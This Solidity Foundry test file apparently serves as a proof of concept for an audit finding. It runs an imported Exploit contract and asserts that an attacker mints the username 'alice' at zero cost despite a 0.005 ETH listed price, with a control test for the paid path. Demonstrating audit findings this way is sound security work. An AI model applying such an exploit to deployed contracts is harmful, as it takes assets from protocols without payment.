// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {
    Exploit,
    GigaNameNFT,
    AccountSystem
} from "./53288-h-05-zero-username-price-when-it-is-minted-with-mintusername.sol";

contract GigaNameZeroPriceTest is Test {
    function test_exploit_mintUsername_costsZeroAndAttackerReceivesAlice() public {
        Exploit e = new Exploit();
        GigaNameNFT names = e.names();
        AccountSystem system = e.accountSystem();

        uint256 price = system.mintPrice();
        assertEq(price, 0.005 ether, "listed price is not 0.005 ETH");
        assertEq(names.balanceOf(address(this)), 0, "attacker starts with a name");

        e.run();

        console.log("listed price wei", e.listedPrice());
        console.log("name-table price wei", e.nameTablePrice());
        console.log("eth charged for alice", e.ethCharged());
        console.log("protocol fees", e.protocolFees());
        console.log("token id", e.tokenId());

        assertEq(e.listedPrice(), 0.005 ether, "run saw the wrong listed price");
        assertEq(e.nameTablePrice(), 0, "GigaNameNFT table was not zero");
        assertEq(e.ethCharged(), 0, "alice was not free");
        assertEq(e.protocolFees(), 0, "protocol collected ETH");
        assertEq(e.nameOwner(), address(this), "attacker did not receive alice");
        assertEq(e.mintedName(), "alice", "wrong username");
        assertEq(names.balanceOf(address(this)), 1, "name balance");
        assertEq(names.ownerOf(e.tokenId()), address(this), "ownerOf");
        assertEq(address(names).balance, 0, "NFT contract kept ETH");
        assertEq(address(system).balance, 0, "AccountSystem kept ETH");
    }

    function test_control_mintWithEth_chargesListedPriceAndRejectsZero() public {
        Exploit e = new Exploit();
        AccountSystem system = e.accountSystem();
        GigaNameNFT names = e.names();
        uint256 price = system.mintPrice();
        assertEq(price, 0.005 ether, "control price");

        uint256 id = system.mintWithEth{value: price}(address(this), "bob");
        assertEq(names.ownerOf(id), address(this), "payer did not receive bob");
        assertEq(names.tokenName(id), "bob", "control name");
        assertEq(names.ethPaid(id), price, "bob was not charged N");
        assertEq(system.feesCollected(), price, "fees");
        assertEq(address(names).balance, price, "ETH not collected");

        bool zeroMinted;
        try system.mintWithEth{value: 0}(address(this), "carol") returns (uint256) {
            zeroMinted = true;
        } catch {}
        assertFalse(zeroMinted, "mintWithEth accepted 0");
        assertEq(names.balanceOf(address(this)), 1, "zero-value mint created a name");
    }
}
